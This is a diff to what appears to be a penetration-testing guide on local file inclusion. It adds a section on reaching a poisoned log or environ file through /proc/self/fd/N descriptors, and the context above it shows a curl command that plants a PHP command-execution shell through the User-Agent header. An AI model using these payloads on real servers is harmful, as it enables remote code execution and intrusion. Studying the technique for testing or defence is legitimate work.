@@ -277,6 +277,16 @@ curl -A '<?php system($_GET["cmd"]); ?>' \
      'https://target/?page=/proc/self/environ&cmd=id'
 ```
 
+### `/proc/self/fd/N` - open file descriptors
+
+`/proc/self/fd/` holds a symlink to every file the process has open, numbered by descriptor. When a log file is held open by the web process but `/var/log` reads are blocked (restrictive permissions, `open_basedir`), the log is often still reachable through its descriptor:
+
+```
+?page=/proc/self/fd/N&cmd=id     # N = descriptor number, usually in 0-50
+```
+
+The number isn't predictable, so sweep the low range (0-50). This reaches the same poisoned log (or `environ`) by a different path when the direct filename is denied - subject to the same process-owner read restriction as `environ`.
+
 ### Caveats
 
 - **Linux only** - `/proc` is Linux-specific. Windows targets don't have this file.
